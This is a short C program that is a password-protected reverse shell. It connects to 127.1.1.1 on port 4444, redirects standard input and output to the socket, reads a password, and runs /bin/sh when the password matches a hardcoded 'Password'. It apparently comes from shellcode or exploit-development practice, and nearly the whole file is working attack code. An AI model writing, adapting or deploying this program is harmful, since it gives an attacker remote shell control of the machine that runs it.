#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(int argc, char **argv)
{

	char *p = "Password";
	int length = strlen(p);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = inet_addr("127.1.1.1")
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));

	dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

	char pass[64];
	read(sockfd, pass, 64);
	
	if (strncmp(pass, p, length) == 0)
	{
		execve("/bin/sh", NULL, NULL);
	}
	else
	{
		exit(-1);
	}
	
	return 0;
}
